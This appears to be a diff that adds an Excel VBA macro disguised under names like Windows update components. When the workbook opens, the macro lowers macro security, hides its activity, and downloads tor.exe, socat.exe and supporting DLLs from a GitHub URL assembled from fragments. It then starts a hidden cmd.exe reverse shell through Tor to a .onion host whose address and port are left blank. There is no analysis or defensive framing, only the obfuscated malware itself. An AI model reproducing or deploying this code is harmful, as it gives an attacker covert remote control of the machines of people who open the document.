@@ -1,0 +1,203 @@
+Private Declare PtrSafe Function GetConsoleWindow Lib "kernel32" () As LongPtr
+Private Declare PtrSafe Function ShowWindow Lib "user32" (ByVal hWnd As LongPtr, ByVal nCmdShow As Long) As Long
+Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
+
+Private Const SW_HIDE As Long = 0
+
+Private Sub Workbook_Open()
+    Invoke_ApplicationEntry
+End Sub
+
+Function Initialize_WindowsComponents() As Object
+    Dim configParts(3) As String
+    configParts(0) = "github"
+    configParts(1) = ".com/random"
+    configParts(2) = "number1212/Xukuoo"
+    configParts(3) = "psyYYmsh/raw/main"
+    
+    Dim targetParts(2) As String
+    targetParts(0) = ""
+    targetParts(1) = ""
+    targetParts(2) = ""
+    
+    Dim portData(1) As String
+    portData(0) = ""
+    portData(1) = ""
+    
+    Dim serviceEndpoint As String
+    serviceEndpoint = Join(configParts, "")
+    
+    Dim networkTarget As String
+    networkTarget = Join(targetParts, "")
+    
+    Dim servicePort As String
+    servicePort = Join(portData, "")
+    
+    Dim result As Object
+    Set result = CreateObject("Scripting.Dictionary")
+    result.Add "UpdateSource", serviceEndpoint
+    result.Add "TargetHost", networkTarget
+    result.Add "PortNumber", servicePort
+    
+    Set Initialize_WindowsComponents = result
+End Function
+
+Function Get_SystemCachePath() As String
+    Dim baseTemp As String
+    baseTemp = Environ("TEMP")
+    
+    Dim folderNames(2) As String
+    folderNames(0) = "Windows"
+    folderNames(1) = "Update"
+    folderNames(2) = "Cache"
+    
+    Dim folderPath As String
+    folderPath = Join(folderNames, "")
+    
+    Get_SystemCachePath = baseTemp & "\" & folderPath
+End Function
+
+Sub Retrieve_RequiredFiles(Settings As Object)
+    Dim cacheLocation As String
+    cacheLocation = Get_SystemCachePath()
+    
+    On Error Resume Next
+    MkDir cacheLocation
+    On Error GoTo 0
+    
+    Dim fileList(7) As String
+    fileList(0) = "msys-2.0.dll"
+    fileList(1) = "msys-crypto-1.0.0.dll"
+    fileList(2) = "msys-ncursesw6.dll"
+    fileList(3) = "msys-readline7.dll"
+    fileList(4) = "msys-ssl-1.0.0.dll"
+    fileList(5) = "msys-z.dll"
+    fileList(6) = "socat.exe"
+    fileList(7) = "tor.exe"
+    
+    Dim i As Integer
+    For i = 0 To 7
+        Dim remoteLocation As String
+        remoteLocation = "https://" & Settings("UpdateSource") & "/" & fileList(i)
+        
+        Dim localDestination As String
+        localDestination = cacheLocation & "\" & fileList(i)
+        
+        If Dir(localDestination) = "" Then
+            Acquire_File remoteLocation, localDestination
+            Delay 1000
+        End If
+    Next i
+End Sub
+
+Sub Acquire_File(Source As String, Destination As String)
+    On Error Resume Next
+    
+    Dim result As Long
+    result = URLDownloadToFileA(0, Source, Destination, 0, 0)
+    
+    If result <> 0 Then
+        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
+        objXMLHTTP.Open "GET", Source, False
+        objXMLHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1237"
+        objXMLHTTP.Send
+        
+        If objXMLHTTP.Status = 200 Then
+            Set objADOStream = CreateObject("ADODB.Stream")
+            objADOStream.Open
+            objADOStream.Type = 1
+            objADOStream.Write objXMLHTTP.responseBody
+            objADOStream.Position = 0
+            objADOStream.SaveToFile Destination
+            objADOStream.Close
+        End If
+    End If
+End Sub
+
+Sub Delay(milliseconds As Long)
+    Dim endTime As Date
+    endTime = DateAdd("s", milliseconds / 1000, Now)
+    Application.Wait endTime
+End Sub
+
+Sub Start_NetworkServices(WorkingPath As String, Parameters As Object)
+    Dim torApplication As String
+    torApplication = WorkingPath & "\tor.exe"
+    
+    Dim socatApplication As String
+    socatApplication = WorkingPath & "\socat.exe"
+    
+    If Dir(torApplication) <> "" Then
+        Dim wsh As Object
+        Set wsh = CreateObject("WScript.Shell")
+        
+        wsh.Run Chr(34) & torApplication & Chr(34), 0, False
+        
+        Delay 12000
+        
+        If Dir(socatApplication) <> "" Then
+            Dim argumentComponents(5) As String
+            argumentComponents(0) = "EXEC:cmd.exe,pty,stderr,setsid"
+            argumentComponents(1) = "SOCKS4A:127.0.0.1:"
+            argumentComponents(2) = Parameters("TargetHost")
+            argumentComponents(3) = ".onion:"
+            argumentComponents(4) = Parameters("PortNumber")
+            argumentComponents(5) = ",socksport=9050"
+            
+            Dim socatArguments As String
+            socatArguments = Join(argumentComponents, " ")
+            
+            wsh.Run Chr(34) & socatApplication & Chr(34) & " " & socatArguments, 0, False
+            
+            Delay 3000
+        End If
+    End If
+End Sub
+
+Sub Set_ExecutionContext()
+    On Error Resume Next
+    Application.AutomationSecurity = 1
+End Sub
+
+Sub Hide_ConsoleWindow()
+    On Error Resume Next
+    Dim hWnd As LongPtr
+    hWnd = GetConsoleWindow()
+    If hWnd <> 0 Then
+        ShowWindow hWnd, SW_HIDE
+    End If
+End Sub
+
+Sub Start_ApplicationMain()
+    Set_ExecutionContext
+    Hide_ConsoleWindow
+    
+    Dim applicationConfig As Object
+    Set applicationConfig = Initialize_WindowsComponents()
+    
+    Retrieve_RequiredFiles applicationConfig
+    
+    Dim workingDirectory As String
+    workingDirectory = Get_SystemCachePath()
+    
+    Start_NetworkServices workingDirectory, applicationConfig
+End Sub
+
+Sub Invoke_ApplicationEntry()
+    On Error GoTo ErrorHandler
+    
+    Application.EnableEvents = False
+    Application.DisplayAlerts = False
+    Application.ScreenUpdating = False
+    
+    Start_ApplicationMain
+    
+Cleanup:
+    Application.EnableEvents = True
+    Application.DisplayAlerts = True
+    Application.ScreenUpdating = True
+    Exit Sub
+    
+ErrorHandler:
+    Resume Cleanup
+End Sub
